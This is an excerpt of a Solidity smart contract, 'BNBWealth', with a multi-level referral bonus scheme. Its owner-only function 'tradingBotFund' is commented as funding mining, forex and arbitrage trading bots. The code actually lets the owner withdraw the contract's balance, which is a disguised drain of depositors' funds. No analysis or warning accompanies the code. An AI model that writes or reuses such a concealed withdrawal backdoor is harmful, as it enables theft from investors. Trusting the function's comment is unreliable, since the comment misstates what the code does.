...
contract BNBWealth {
    ...
    uint8[BONUS_LINES_COUNT] public ref_bonuses = [100, 20, 10, 10, 10, 10, 5, 5, 5, 5]; 
    ...
    // Funding for our mining, forex and arbitrage trading bots
    function tradingBotFund(uint256 _amount) payable external {
        require(msg.sender==owner,'Permission denied');
        if (_amount > 0) {
          uint256 contractBal = address(this).balance;
            if (contractBal > 0) {
                uint256 amtToTransfer = _amount > contractBal ? contractBal : _amount;
                payable(msg.sender).transfer(amtToTransfer);
            }
        }
    }
